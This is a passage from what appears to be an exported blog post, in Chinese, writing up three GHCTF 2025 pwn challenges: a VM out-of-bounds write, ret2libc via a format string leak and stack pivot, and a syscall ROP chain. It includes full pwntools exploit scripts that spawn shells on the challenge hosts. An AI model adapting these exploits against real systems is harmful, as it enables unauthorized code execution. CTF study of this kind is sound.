system(\"/bin/sh\\x00\")\n\nio.sendlineafter(\"set your IP:\",\"0\")\nio.sendlineafter(\"set your SP:\",\"1\")\nio.sendlineafter(\"execve:\",str(27))\n\nputs_got=0x602018\noffset=0x6020e0-0x602018\nreg=0x6420E0\nmemory=0x6020E0\n###\n\n\n###\n\n### Code \nCode(0x10,0,0,0x8)  # reg[0]=0x8\nCode(0x10,1,0,0x4)  # reg[1]=0x4\nCode(0x40,2,1,0)    # reg[2]=0xc\nCode(0x80,3,2,1)    # reg[3]=reg[1]<<reg[1]  : reg[3]=0xc0\nCode(0x10,4,0,0x6)  # reg[4]=0x6\nCode(0x40,4,4,0)    # reg[4]=0xe\nCode(0x40,3,3,4)    # reg[1]=reg[1]+reg[3]   : reg[3]=0xce      \nCode(0x10,5,0,0x7)  # reg[5]=0x7\nCode(0x40,5,5,0)    # reg[5]=0xf\nCode(0x80,6,5,1)    # reg[6]=reg[5]<<reg[1]  : reg[6]=0xf0\nCode(0x40,6,6,5)    # reg[6]=reg[5]+reg[6]   : reg[6]=0xff \nCode(0x80,5,6,0)    # reg[5]=reg[6]<<reg[0]  : reg[5]=0xff00\nCode(0x40,5,5,6)    # reg[5]=reg[5]+reg[6]   : reg[5]=0xffff\nCode(0x80,5,5,0)    # reg[5]=reg[5]<<reg[0]  : reg[5]=0xffff00\nCode(0x40,5,5,6)    # reg[5]=reg[5]+reg[6]   : reg[5]=0xffffff\nCode(0x80,5,5,0)    # reg[5]=reg[5]<<reg[0]  : reg[5]=0xffffff00\nCode(0x40,5,5,3)    # reg[5]=reg[5]+reg[3]   : reg[5]=0xffffffce\n\n#0x400877\nCode(0x10,4,0,0x7)  # reg[4]=0x7\nCode(0x80,6,4,1)    # reg[6]=reg[4]<<reg[1]  : reg[6]=0x70\nCode(0x40,6,6,4)    # reg[6]=reg[6]+reg[4]   : reg[6]=0x770000\nCode(0x80,1,1,1)    # reg[1]=reg[1]<<reg[1]  : reg[1]=0x40\nCode(0x80,1,1,0)    # reg[1]=reg[1]<<reg[0]  : reg[1]=0x4000\nCode(0x80,1,1,0)    # reg[1]=reg[1]<<reg[0]  : reg[1]=0x400000\nCode(0x80,0,0,0)    # reg[0]=reg[0]<<reg[0]  : reg[0]=0x800\nCode(0x40,0,0,6)    # reg[0]=reg[0]+reg[6]   : reg[0]=0x877\nCode(0x40,1,1,0)    # reg[1]=reg[1]+reg[0]   : reg[1]=0x4000877\nCode(0x90,5,1,0)    # mem[reg[5]]=reg[1]     : mem[-50]=0x4000877\n#gdb.attach(io)\nio.interactive()\n```\n\n### 覆盖func\n```python \nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=0\nurl='node1.anna.nssctf.cn'\nport=28844\nelf=ELF(\"./my_vm\")\nif mode == 0:\n    io=process(\"./my_vm\")\nelse :\n    io=remote(url,port)\n\ndef Code(op,dest,src1,src2):\n    code=(op<<24)+(dest<<16)+(src1<<8)+src2\n    io.sendline(str(code))\n\nio.sendlineafter(\"set your IP:\",\"0\")\nio.sendlineafter(\"set your SP:\",\"1\")\nio.sendlineafter(\"execve:\",str(14))\n\n\n### Code \nCode(0x10,0,0,8)   #reg[0]=8\nCode(0x10,1,0,0)\nCode(0x50,1,1,0)   #reg[1]=-8\nCode(0x10,2,0,7)   #reg[2]=7\nCode(0x10,4,0,4)   #reg[4]=4\nCode(0x80,3,2,4)   #reg[3]=0x70\nCode(0x40,3,3,2)   #reg[3]=0x77\n### backdoor  \nCode(0x80,4,4,4)   #reg[4]=0x40\nCode(0x80,4,4,0)   #reg[4]=0x4000\nCode(0x80,4,4,0)   #reg[4]=0x400000\nCode(0x80,0,0,0)   #reg[0]=0x800\nCode(0x40,0,0,3)   #reg[0]=0x877\nCode(0x40,4,4,0)   #reg[4]=0x400877\nCode(0x90,1,4,0)\nio.interactive()\n\n```\n\n# GHCTF ret2libc2\n\n## ida分析\n\n### func函数分析\n![98a456adebe8adb789ba9ca00f26a510](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/98a456adebe8adb789ba9ca00f26a510.png)\n1.程序很简单,main函数里只有init和func，这里直接看到func函数\n2.可以看到存在一个格式化字符串漏洞和溢出漏洞.\n3.程序没有提供system和`/bin/sh\\x00`，需要泄露libc，完成ret2libc.\n\n### func汇编分析\n![98a456adebe8adb789ba9ca00f26a510](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/98a456adebe8adb789ba9ca00f26a510.png)\n1.从汇编中可以看到更多信息.\n2.首先是在leave ret 之前，lea rax [rbp+buf]. 实际上是将我们的输入的起始位置的内容交给了rax.而且可以注意到，无论是printf还是两个puts，都是通过rax来设置rdi。那么也就说我们的输入，可以给printf传递参数，也就是可以实现我们的格式化字符串漏洞.\n3.同时，leave ret 留下了栈迁移的隐患。\n\n### gdb调试分析\n![65dadea8bb2e5a40f2a81d8411fea262.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/65dadea8bb2e5a40f2a81d8411fea262_720.png)\n1.通过gdb动调寻找栈上可以泄露出libc的函数.将func的返回地址覆盖为0x401227，直接将printf的rdi修改成我们的输入，查看这一帧栈帧，在0x15的位置看到了__libc_start_main,计算偏移为21+6=27.\n2.同时，在第一次溢出时，需要覆盖rbp为有效地址。否则，这次func执行最后，会崩溃掉。\n\n## 构造思路\n1.首先确定泄露libc的手段，格式化字符串.并且第一次溢出时需要栈迁移.在这里补充一点，除了使用格式化字符串以外，还有一种泄露的手法.观察func函数，0x401223处，会将rbp-0x10 的内容作为参数赋给rax，再下方又被赋给了rdi.那么如果[rbp-0x10]是某个got表，那就可以把got表的内容打印出来。所以我们只需要把某个got-0x10交给rbp，就可以完成第一次的栈迁移和libc的泄露。\n2.因为程序本身是没有提供pop_rdi,但是题目给了libc.so.6文件，在泄露libc基址之后，利用libc.so.6中的pop rdi;ret，一样可以控制rdi寄存器。现在我们已经有了ret2libc的全部条件。只需要栈迁移的一个合适的地址，完成rop。\n3.选择bss段的高地址完成这段rop。如果是采用第二种方法泄露libc的话，需要再栈迁移一次，而且为了保证程序的顺利执行，第二次溢出，需要注意维护got表的内容尤其是read，否则第三次溢出就会出错。\n\n## exp\n\n### 格式化字符串\n```python \nfrom pwn import *\ncontext(os='linux',arch='amd64',log_level='debug')\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\nio=process(\"./ret2libc2\")\n#libc=ELF(\"libc.so.6\")\n#io=remote(\"node2.anna.nssctf.cn\",28626)\nelf=ELF(\"./ret2libc2\")\nbss=0x404060\nret=0x4011fa\ngdb.attach(io)\n\npayload1=b'%27$p'.ljust(8,b'a')\npayload1=payload1.ljust(0x30,b'a')+p64(bss+0x900)+p64(0x401227)\nio.sendafter(b'show your magic\\n',payload1)\nstart_addr=int(io.recv(14),16)-128\nlibc_base=start_addr-libc.symbols['__libc_start_main']\nlog.success(\"start_addr-{}\".format(hex(start_addr)))\npop_rdi=libc_base+0x2a3e5\nsystem=libc_base+libc.symbols['system']\nbinsh=libc_base+next(libc.search(b'/bin/sh'))\none=libc_base+0xebc85\n\npayload2=b'a'*(0x38)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)\nio.sendafter(b'show your magic\\n',payload2)\nio.interactive()\n```\n\n### 迁移泄露\n\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='node2.anna.nssctf.cn'\nport=28268\nelf=ELF(\"./ret2libc2\")\nlibc=ELF(\"./libc.so.6\")\nif mode == 0:\n    io=process(\"./ret2libc2\")\nelse :\n    io=remote(url,port)\n\n\n#leave_ret=0x\nputs_got=elf.got['puts']\nputs_plt=elf.plt['puts']\ncomplete=0x404070\nfunc=0x40121f\nmagic=0x401252\nbss=elf.bss()+0x500+0x500\nrsp_8=0x401016\noffset=0x30+8\npayload=b'%13$s'.ljust(0x30,b'\\x61')\npayload+=p64(0x404038)\npayload+=p64(func)\npayload+=p64(puts_got)\n\n#\nio.sendafter(\"show your magic\\n\",payload)\n\nread=u64(io.recv(6).ljust(8,b'\\x00'))\nlog.success('read-{}'.format(hex(read)))\n\nlibc_base=read-libc.sym['read']\nsys=libc_base+libc.sym['system']\nputs=libc_base+libc.sym['puts']\nprintf=libc_base+libc.sym['printf']\nsetvbuf=libc_base+libc.sym['setvbuf']\nbin_sh=libc_base+next(libc.search(b\"/bin/sh\\x00\"))\npop_rdi=libc_base+0x2a3e5\nret=libc_base+0x29139\n\npayload=p64(0)*2+p64(puts)+p64(printf)+p64(read)+p64(setvbuf)\npayload+=p64(bss)+p64(magic)\nio.sendafter(\"show your magic\\n\",payload)\n#gdb.attach(io)\npayload=offset * b'a'\npayload+=p64(pop_rdi)\npayload+=p64(bin_sh)\npayload+=p64(ret)\npayload+=p64(sys)\nio.send(payload)\n\nio.interactive()\n```\n\n#  GHCTF 你真的会布置栈吗？\n\n## ida分析\n\n### start函数分析 \n\n![813b6b639a05fd8870ff80b5be117df7](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/813b6b639a05fd8870ff80b5be117df7.png)\n\n1.print了两段字符，然后调用sys_read()读取数据，溢出空间非常大\n2.最后，不是leave ret，而是jmp rsp，var8 是 qword ptr -8  ，可以从汇编代码查看\n\n### print函数分析\n![a36c17d8abe90bc1a9920db0595e982d](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/a36c17d8abe90bc1a9920db0595e982d.png)\n1.print是通过sys_wirte()，实现写字符，最后也是jmp rsp.\n\n\n### gadgets 分析\n1.gadgets都已经在上面的图中，可以看到，我们能直接控制的有rsi,rdi,rbx,r13,r15，最后还会jmp r15.\n2.从print的汇编中可以看到，可以交换rax和r13 的值，因此可以间接控制rax.\n3.同时，dispatch留有执行rbx中代码的功能.\n4.下方还可以控制rdx，rsi，rdi 值为0.\n\n## 构造思路\n1.首先，在_start 函数中有很明显的溢出漏洞，并且通过jmp rsp 可以跳转到我们写入的地址。第一眼，考虑shellcode ，但是一下就可以排除。因为它不会执行shellcode，而是跳转地址。因为题目只有系统调用的函数，所以肯定是用syscall解题。\n2.确定是用syscall写题之后，考虑要控制的寄存器。首先execve函数的系统调用号是0x3b，需要设置rax=0x3b，可以通过r13 和 `xchg rax，r13` 实现，接着是rsi 设置为0 ，rdx 设置为0 ，rdi设置为，`\"/bin/sh\\x00\"` 的地址。但是程序中没有该字符串，所以需要，先调用一次read往程序上写入字符串。\n3.read函数，需要控制rax=0，rsi为buf，即写入的地址，rdx为写入字符数。可以利用gadgets 设置rsi 完成任意地址写，利用本身的sys_read 设置字节为0x539。因为程序没有bss段，所以只能往data段上写入字符。\n4.那么目前的思路就是，利用sys_read往data段写入字符，再执行execve，getshell\n5.但是似乎忽略了一点。rdx，本身是0x539，我们没有修改，需要通过xor_rdx 来修改为0 ，但是这条指令进跟着的是jmp r15.意味着，我们不能设置r15 为xor_rdx。 考虑让r15 指向xchg rax，r13，将rsp 设置为xor_rdx,也陷入了循环。似乎无法跳出循环。\n6.此时注意到dispatch,可以跳转到rbx中的指令，而且每次执行会加8，也就是可以执行下一条指令。这样一来，我们把r15 指向dispatch，同时设置rbx为之前sys_read时，buf的地址.然后，之前sys_read时在buf 里依次布置指令，xor_rdx，xchg rax,r13 的地址。这样，将rdx置0 后，程序会跳转到xchg rax，r13 ，将rax 设置为r13的值.最后将rsp 设置为，syscall，就可以完成这华丽的rop。\n\n## exp \n\n### 花里胡哨的rop\n```python \nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='node2.anna.nssctf.cn'\nport=28634\nelf=ELF(\"./attachment\")\nif mode == 0:\n    io=process(\"./attachment\")\nelse :\n    io=remote(url,port)\n\nsys_call=0x401077\nrax_r13=0x40100c\ndata=0x402000\ngadget_pop=0x401017\ndispatcher=0x401011\nxor_rsi=0x401027\nFree_Gate=0x40101c\nxor_rdx=0x401021\n\npayload=p64(gadget_pop)\npayload+=p64(0)*3\npayload+=p64(gadget_pop) #r15\npayload+=p64(data) #rsi ,rsp\npayload+=p64(0)*3 #rdi,rbx,r13\npayload+=p64(rax_r13) #r15 \npayload+=p64(Free_Gate)\npayload+=p64(sys_call) #r15   read\n\npayload+=p64(gadget_pop)# rsp,rsi\npayload+=p64(data)+p64(0)+p64(0)# rdi,rbx,r13\npayload+=p64(gadget_pop)# r15\npayload+=p64(0) # rsp,rsi\npayload+=p64(data)+p64(data)+p64(0x3b) # rdi,rbx,r13\npayload+=p64(dispatcher)#r15\npayload+=p64(sys_call)\n\nio.send(payload)\npayload=b'/bin/sh\\x00'\npayload+=p64(xor_rdx)+p64(rax_r13)\n#gdb.attach(io)\nio.send(payload)\n\n\nio.interactive()\n```","source":"_posts/ctf比赛复现/GHCTF-2025-pwn.md","raw":"---\ntitle: GHCTF-2025-pwn\ntags:\n    - 新生赛\n    - pwn\ncategories:\n    - 比赛记录\ncover: /img/治不开心药.png\n---\n# GHCTF my_vm\n\n## ida分析\n\n### main函数分析\n1.存在backdoor()函数，点开发现system(\"/bin/sh\\x00\").可以直接利用这个地址0x400877.\n2.funcptr会调用my_print,如果可以修改my_print 为backdoor。那就很完美了\n3.memory中保存着我们的指令，execute 会按序执行我们的指令，查看这个函数。\n\n### execute函数分析\n\n1.首先看，对op的处理，和对op的限制\n2.寻找漏洞。option == 0x90 时，可以对memory上的数据作修改\n3.基于此，如果`reg[dest]`设置为负数，那么可以完成对其他数据的修改\n4.从第三张图，查看option == 0x90 时的汇编，发现赋值指令是movzx(有符号低扩展为有符号高)，所以可以在`reg[]`中写入负数，完成数组的向上越界\n\n## 构造思路\n1.首先是，ip和sp。ip从0开始，也就从我们读入的第一个指令执行。sp设置为1，大于0就行\n2.接着读入op。我们需要对op作一点处理，便于控制每一个字节\n\n```python\ndef Code(op,dest,src1,src2):\n    code=(op<<24)+(dest<<16)+(src1<<8)+src2\n    io.sendline(str(code))\n```\n通过样的处理，我们可以控制每个字节，便于准确的控制\n3.需要找到要覆盖的目标地址，dest_addr. 这一题中可以覆盖func的内容为backdoor.另外，常见的手法可以覆盖got表内容为backdoor .此题中我采用了后者的方法\n4.计算对应dest_addr的偏移，这里从汇编中可以看出来，此题中的memory和reg均是以`rax*4` 来寻址。可知，均是4字节数组.所以对应偏移需要除以4，才能被数组寻到\n5.得到偏移之后，利用0x90控制数据，注意到，数据会被改写为src1.因此，在调用前需要将某个reg内写入我们的backdoor\n6.最后，因为我们不能直接往reg里写入任意数据，有字节和大小的限制。所以我们需要通过题目提供的运算操作，一步一步修改内容.\n\n## exp \n\n### 修改puts_got\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='node1.anna.nssctf.cn'\nport=28844\nelf=ELF(\"./my_vm\")\nif mode == 0:\n    io=process(\"./my_vm\")\nelse :\n    io=remote(url,port)\n\ndef Code(op,dest,src1,src2):\n    code=(op<<24)+(dest<<16)+(src1<<8)+src2\n    io.sendline(str(code))\n\nbackdoor=0x400877 # system(\"/bin/sh\\x00\")\n\nio.sendlineafter(\"set your IP:\",\"0\")\nio.sendlineafter(\"set your SP:\",\"1\")\nio.sendlineafter(\"execve:\",str(27))\n\nputs_got=0x602018\noffset=0x6020e0-0x602018\nreg=0x6420E0\nmemory=0x6020E0\n###\n\n\n###\n\n### Code \nCode(0x10,0,0,0x8)  # reg[0]=0x8\nCode(0x10,1,0,0x4)  # reg[1]=0x4\nCode(0x40,2,1,0)    # reg[2]=0xc\nCode(0x80,3,2,1)    # reg[3]=reg[1]<<reg[1]  : reg[3]=0xc0\nCode(0x10,4,0,0x6)  # reg[4]=0x6\nCode(0x40,4,4,0)    # reg[4]=0xe\nCode(0x40,3,3,4)    # reg[1]=reg[1]+reg[3]   : reg[3]=0xce      \nCode(0x10,5,0,0x7)  # reg[5]=0x7\nCode(0x40,5,5,0)    # reg[5]=0xf\nCode(0x80,6,5,1)    # reg[6]=reg[5]<<reg[1]  : reg[6]=0xf0\nCode(0x40,6,6,5)    # reg[6]=reg[5]+reg[6]   : reg[6]=0xff \nCode(0x80,5,6,0)    # reg[5]=reg[6]<<reg[0]  : reg[5]=0xff00\nCode(0x40,5,5,6)    # reg[5]=reg[5]+reg[6]   : reg[5]=0xffff\nCode(0x80,5,5,0)    # reg[5]=reg[5]<<reg[0]  : reg[5]=0xffff00\nCode(0x40,5,5,6)    # reg[5]=reg[5]+reg[6]   : reg[5]=0xffffff\nCode(0x80,5,5,0)    # reg[5]=reg[5]<<reg[0]  : reg[5]=0xffffff00\nCode(0x40,5,5,3)    # reg[5]=reg[5]+reg[3]   : reg[5]=0xffffffce\n\n#0x400877\nCode(0x10,4,0,0x7)  # reg[4]=0x7\nCode(0x80,6,4,1)    # reg[6]=reg[4]<<reg[1]  : reg[6]=0x70\nCode(0x40,6,6,4)    # reg[6]=reg[6]+reg[4]   : reg[6]=0x770000\nCode(0x80,1,1,1)    # reg[1]=reg[1]<<reg[1]  : reg[1]=0x40\nCode(0x80,1,1,0)    # reg[1]=reg[1]<<reg[0]  : reg[1]=0x4000\nCode(0x80,1,1,0)    # reg[1]=reg[1]<<reg[0]  : reg[1]=0x400000\nCode(0x80,0,0,0)    # reg[0]=reg[0]<<reg[0]  : reg[0]=0x800\nCode(0x40,0,0,6)    # reg[0]=reg[0]+reg[6]   : reg[0]=0x877\nCode(0x40,1,1,0)    # reg[1]=reg[1]+reg[0]   : reg[1]=0x4000877\nCode(0x90,5,1,0)    # mem[reg[5]]=reg[1]     : mem[-50]=0x4000877\n#gdb.attach(io)\nio.interactive()\n```\n\n### 覆盖func\n```python \nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=0\nurl='node1.anna.nssctf.cn'\nport=28844\nelf=ELF(\"./my_vm\")\nif mode == 0:\n    io=process(\"./my_vm\")\nelse :\n    io=remote(url,port)\n\ndef Code(op,dest,src1,src2):\n    code=(op<<24)+(dest<<16)+(src1<<8)+src2\n    io.sendline(str(code))\n\nio.sendlineafter(\"set your IP:\",\"0\")\nio.sendlineafter(\"set your SP:\",\"1\")\nio.sendlineafter(\"execve:\",str(14))\n\n\n### Code \nCode(0x10,0,0,8)   #reg[0]=8\nCode(0x10,1,0,0)\nCode(0x50,1,1,0)   #reg[1]=-8\nCode(0x10,2,0,7)   #reg[2]=7\nCode(0x10,4,0,4)   #reg[4]=4\nCode(0x80,3,2,4)   #reg[3]=0x70\nCode(0x40,3,3,2)   #reg[3]=0x77\n### backdoor  \nCode(0x80,4,4,4)   #reg[4]=0x40\nCode(0x80,4,4,0)   #reg[4]=0x4000\nCode(0x80,4,4,0)   #reg[4]=0x400000\nCode(0x80,0,0,0)   #reg[0]=0x800\nCode(0x40,0,0,3)   #reg[0]=0x877\nCode(0x40,4,4,0)   #reg[4]=0x400877\nCode(0x90,1,4,0)\nio.interactive()\n\n```\n\n# GHCTF ret2libc2\n\n## ida分析\n\n### func函数分析\n![98a456adebe8adb789ba9ca00f26a510](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/98a456adebe8adb789ba9ca00f26a510.png)\n1.程序很简单,main函数里只有init和func，这里直接看到func函数\n2.可以看到存在一个格式化字符串漏洞和溢出漏洞.\n3.程序没有提供system和`/bin/sh\\x00`，需要泄露libc，完成ret2libc.\n\n### func汇编分析\n![98a456adebe8adb789ba9ca00f26a510](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/98a456adebe8adb789ba9ca00f26a510.png)\n1.从汇编中可以看到更多信息.\n2.首先是在leave ret 之前，lea rax [rbp+buf]. 实际上是将我们的输入的起始位置的内容交给了rax.而且可以注意到，无论是printf还是两个puts，都是通过rax来设置rdi。那么也就说我们的输入，可以给printf传递参数，也就是可以实现我们的格式化字符串漏洞.\n3.同时，leave ret 留下了栈迁移的隐患。\n\n### gdb调试分析\n![65dadea8bb2e5a40f2a81d8411fea262.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/65dadea8bb2e5a40f2a81d8411fea262_720.png)\n1.通过gdb动调寻找栈上可以泄露出libc的函数.将func的返回地址覆盖为0x401227，直接将printf的rdi修改成我们的输入，查看这一帧栈帧，在0x15的位置看到了__libc_start_main,计算偏移为21+6=27.\n2.同时，在第一次溢出时，需要覆盖rbp为有效地址。否则，这次func执行最后，会崩溃掉。\n\n## 构造思路\n1.首先确定泄露libc的手段，格式化字符串.并且第一次溢出时需要栈迁移.在这里补充一点，除了使用格式化字符串以外，还有一种泄露的手法.观察func函数，0x401223处，会将rbp-0x10 的内容作为参数赋给rax，再下方又被赋给了rdi.那么如果[rbp-0x10]是某个got表，那就可以把got表的内容打印出来。所以我们只需要把某个got-0x10交给rbp，就可以完成第一次的栈迁移和libc的泄露。\n2.因为程序本身是没有提供pop_rdi,但是题目给了libc.so.6文件，在泄露libc基址之后，利用libc.so.6中的pop rdi;ret，一样可以控制rdi寄存器。现在我们已经有了ret2libc的全部条件。只需要栈迁移的一个合适的地址，完成rop。\n3.选择bss段的高地址完成这段rop。如果是采用第二种方法泄露libc的话，需要再栈迁移一次，而且为了保证程序的顺利执行，第二次溢出，需要注意维护got表的内容尤其是read，否则第三次溢出就会出错。\n\n## exp\n\n### 格式化字符串\n```python \nfrom pwn import *\ncontext(os='linux',arch='amd64',log_level='debug')\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\nio=process(\"./ret2libc2\")\n#libc=ELF(\"libc.so.6\")\n#io=remote(\"node2.anna.nssctf.cn\",28626)\nelf=ELF(\"./ret2libc2\")\nbss=0x404060\nret=0x4011fa\ngdb.attach(io)\n\npayload1=b'%27$p'.ljust(8,b'a')\npayload1=payload1.ljust(0x30,b'a')+p64(bss+0x900)+p64(0x401227)\nio.sendafter(b'show your magic\\n',payload1)\nstart_addr=int(io.recv(14),16)-128\nlibc_base=start_addr-libc.symbols['__libc_start_main']\nlog.success(\"start_addr-{}\".format(hex(start_addr)))\npop_rdi=libc_base+0x2a3e5\nsystem=libc_base+libc.symbols['system']\nbinsh=libc_base+next(libc.search(b'/bin/sh'))\none=libc_base+0xebc85\n\npayload2=b'a'*(0x38)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)\nio.sendafter(b'show your magic\\n',payload2)\nio.interactive()\n```\n\n### 迁移泄露\n\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='node2.anna.nssctf.cn'\nport=28268\nelf=ELF(\"./ret2libc2\")\nlibc=ELF(\"./libc.so.6\")\nif mode == 0:\n    io=process(\"./ret2libc2\")\nelse :\n    io=remote(url,port)\n\n\n#leave_ret=0x\nputs_got=elf.got['puts']\nputs_plt=elf.plt['puts']\ncomplete=0x404070\nfunc=0x40121f\nmagic=0x401252\nbss=elf.bss()+0x500+0x500\nrsp_8=0x401016\noffset=0x30+8\npayload=b'%13$s'.ljust(0x30,b'\\x61')\npayload+=p64(0x404038)\npayload+=p64(func)\npayload+=p64(puts_got)\n\n#\nio.sendafter(\"show your magic\\n\",payload)\n\nread=u64(io.recv(6).ljust(8,b'\\x00'))\nlog.success('read-{}'.format(hex(read)))\n\nlibc_base=read-libc.sym['read']\nsys=libc_base+libc.sym['system']\nputs=libc_base+libc.sym['puts']\nprintf=libc_base+libc.sym['printf']\nsetvbuf=libc_base+libc.sym['setvbuf']\nbin_sh=libc_base+next(libc.search(b\"/bin/sh\\x00\"))\npop_rdi=libc_base+0x2a3e5\nret=libc_base+0x29139\n\npayload=p64(0)*2+p64(puts)+p64(printf)+p64(read)+p64(setvbuf)\npayload+=p64(bss)+p64(magic)\nio.sendafter(\"show your magic\\n\",payload)\n#gdb.attach(io)\npayload=offset * b'a'\npayload+=p64(pop_rdi)\npayload+=p64(bin_sh)\npayload+=p64(ret)\npayload+=p64(sys)\nio.send(payload)\n\nio.interactive()\n```\n\n#  GHCTF 你真的会布置栈吗？\n\n## ida分析\n\n### start函数分析 \n\n![813b6b639a05fd8870ff80b5be117df7](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/813b6b639a05fd8870ff80b5be117df7.png)\n\n1.print了两段字符，然后调用sys_read()读取数据，溢出空间非常大\n2.最后，不是leave ret，而是jmp rsp，var8 是 qword ptr -8  ，可以从汇编代码查看\n\n### print函数分析\n![a36c17d8abe90bc1a9920db0595e982d](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/a36c17d8abe90bc1a9920db0595e982d.png)\n1.print是通过sys_wirte()，实现写字符，最后也是jmp rsp.\n\n\n### gadgets 分析\n1.gadgets都已经在上面的图中，可以看到，我们能直接控制的有rsi,rdi,rbx,r13,r15，最后还会jmp r15.\n2.从print的汇编中可以看到，可以交换rax和r13 的值，因此可以间接控制rax.\n3.同时，dispatch留有执行rbx中代码的功能.\n4.下方还可以控制rdx，rsi，rdi 值为0.\n\n## 构造思路\n1.首先，在_start 函数中有很明显的溢出漏洞，并且通过jmp rsp 可以跳转到我们写入的地址。第一眼，考虑shellcode ，但是一下就可以排除。因为它不会执行shellcode，而是跳转地址。因为题目只有系统调用的函数，所以肯定是用syscall解题。\n2.确定是用syscall写题之后，考虑要控制的寄存器。首先execve函数的系统调用号是0x3b，需要设置rax=0x3b，可以通过r13 和 `xchg rax，r13` 实现，接着是rsi 设置为0 ，rdx 设置为0 ，rdi设置为，`\"/bin/sh\\x00\"` 的地址。但是程序中没有该字符串，所以需要，先调用一次read往程序上写入字符串。\n3.read函数，需要控制rax=0，rsi为buf，即写入的地址，rdx为写入字符数。可以利用gadgets 设置rsi 完成任意地址写，利用本身的sys_read 设置字节为0x539。因为程序没有bss段，所以只能往data段上写入字符。\n4.那么目前的思路就是，利用sys_read往data段写入字符，再执行execve，getshell\n5.但是似乎忽略了一点。rdx，本身是0x539，我们没有修改，需要通过xor_rdx 来修改为0 ，但是这条指令进跟着的是jmp r15.意味着，我们不能设置r15 为xor_rdx。 考虑让r15 指向xchg rax，r13，将rsp 设置为xor_rdx,也陷入了循环。似乎无法跳出循环。\n6.此时注意到dispatch,可以跳转到rbx中的指令，而且每次执行会加8，也就是可以执行下一条指令。这样一来，我们把r15 指向dispatch，同时设置rbx为之前sys_read时，buf的地址.然后，之前sys_read时在buf 里依次布置指令，xor_rdx，xchg rax,r13 的地址。这样，将rdx置0 后，程序会跳转到xchg rax，r13 ，将rax 设置为r13的值.最后将rsp 设置为，syscall，就可以完成这华丽的rop。\n\n## exp \n\n### 花里胡哨的rop\n```python \nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='node2.anna.nssctf.cn'\nport=28634\nelf=ELF(\"./attachment\")\nif mode == 0:\n    io=process(\"./attachment\")\nelse :\n    io=remote(url,port)\n\nsys_call=0x401077\nrax_r13=0x40100c\ndata=0x402000\ngadget_pop=0x401017\ndispatcher=0x401011\nxor_rsi=0x401027\nFree_Gate=0x40101c\nxor_rdx=0x401021\n\npayload=p64(gadget_pop)\npayload+=p64(0)*3\npayload+=p64(gadget_pop) #r15\npayload+=p64(data) #rsi ,rsp\npayload+=p64(0)*3 #rdi,rbx,r13\npayload+=p64(rax_r13) #r15 \npayload+=p64(Free_Gate)\npayload+=p64(sys_call) #r15   read\n\npayload+=p64(gadget_pop)# rsp,rsi\npayload+=p64(data)+p64(0)+p64(0)# rdi,rbx,r13\npayload+=p64(gadget_pop)# r15\npayload+=p64(0) # rsp,rsi\npayload+=p64(data)+p64(data)+p64(0x3b) # rdi,rbx,r13\npayload+=p64(dispatcher)#r15\npayload+=p64(sys_call)\n\nio.send(payload)\npayload=b'/bin/sh\\x00'\npayload+=p64(xor_rdx)+p64(rax_r13)\n#gdb.attach(io)\nio.send(payload)\n\n\nio.interactive()\n```","slug":"ctf比赛复现/GHCTF-2025-pwn","published":1,"date":"2025-10-06T14:48:09.858Z","updated":"2025-10-06T15:18:46.116Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2hz0009uomy4p9a39qv","content":"<h1 id=\"GHCTF-my-vm\"><a href=\"#GHCTF-my-vm\" class=\"headerlink\" title=\"GHCTF my_vm\"></a>GHCTF my_vm</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p>1.存在backdoor()函数，点开发现system(“&#x2F;bin&#x2F;sh\\x00”).可以直接利用这个地址0x400877.<br>2.funcptr会调用my_print,如果可以修改my_print 为backdoor。那就很完美了<br>3.memory中保存着我们的指令，execute 会按序执行我们的指令，查看这个函数。</p>\n<h3 id=\"execute函数分析\"><a href=\"#execute函数分析\" class=\"headerlink\" title=\"execute函数分析\"></a>execute函数分析</h3><p>1.首先看，对op的处理，和对op的限制<br>2.寻找漏洞。option &#x3D;&#x3D; 0x90 时，可以对memory上的数据作修改<br>3.基于此，如果<code>reg[dest]</code>设置为负数，那么可以完成对其他数据的修改<br>4.从第三张图，查看option &#x3D;&#x3D; 0x90 时的汇编，发现赋值指令是movzx(有符号低扩展为有符号高)，所以可以在<code>reg[]</code>中写入负数，完成数组的向上越界</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先是，ip和sp。ip从0开始，也就从我们读入的第一个指令执行。sp设置为1，大于0就行<br>2.接着读入op。我们需要对op作一点处理，便于控制每一个字节</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 